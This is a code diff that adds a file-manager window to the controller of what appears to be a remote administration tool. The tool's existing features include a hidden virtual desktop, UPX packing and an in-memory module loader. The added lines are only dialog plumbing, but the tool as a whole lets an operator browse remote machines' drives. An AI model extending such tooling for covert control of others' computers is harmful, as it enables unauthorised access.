@@ -37,6 +37,7 @@
 #include "DecryptDlg.h"
 #include "adapter.h"
 #include "client/MemoryModule.h"
+#include <file/CFileManagerDlg.h>
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -384,6 +385,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENMACHINEMGRDLG, OnOpenMachineManagerDialog)
 	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
 	ON_MESSAGE(WM_OPENDECRYPTDIALOG, OnOpenDecryptDialog)
+	ON_MESSAGE(WM_OPENFILEMGRDIALOG, OnOpenFileMgrDialog)
 	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
@@ -1723,6 +1725,11 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		Dlg->OnReceiveComplete();
 		break;
 	}
+	case FILEMGR_DLG: {
+		file::CFileManagerDlg* Dlg = (file::CFileManagerDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
 	default: {
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (hEvent == NULL) {
@@ -1875,6 +1882,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 			Sleep(10);
 			break;
 		}
+	case TOKEN_DRIVE_LIST_PLUGIN: // 文件管理
+	{
+		g_2015RemoteDlg->SendMessage(WM_OPENFILEMGRDIALOG, 0, (LPARAM)ContextObject);
+		break;
+	}
 	case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面
 		g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
 		break;
@@ -2124,6 +2136,12 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		{
 			DecryptDlg* Dlg = (DecryptDlg*)p->hDlg;
 			delete Dlg;
+			break;
+		}
+		case FILEMGR_DLG:
+		{
+			file::CFileManagerDlg* Dlg = (file::CFileManagerDlg*)p->hDlg;
+			::PostMessageA(Dlg->GetSafeHwnd(), WM_CLOSE, 0, 0);
 			break;
 		}
 		default:break;
@@ -2445,6 +2463,21 @@ LRESULT CMy2015RemoteDlg::OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam)
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1 = DECRYPT_DLG;
+	ContextObject->hDlg = Dlg;
+
+	return 0;
+}
+
+LRESULT CMy2015RemoteDlg::OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam)
+{
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+
+	file::CFileManagerDlg* Dlg = new file::CFileManagerDlg(this, m_iocpServer, ContextObject);
+
+	Dlg->Create(IDD_FILE_WINOS, GetDesktopWindow());
+	Dlg->ShowWindow(SW_SHOW);
+
+	ContextObject->v1 = FILEMGR_DLG;
 	ContextObject->hDlg = Dlg;
 
 	return 0;
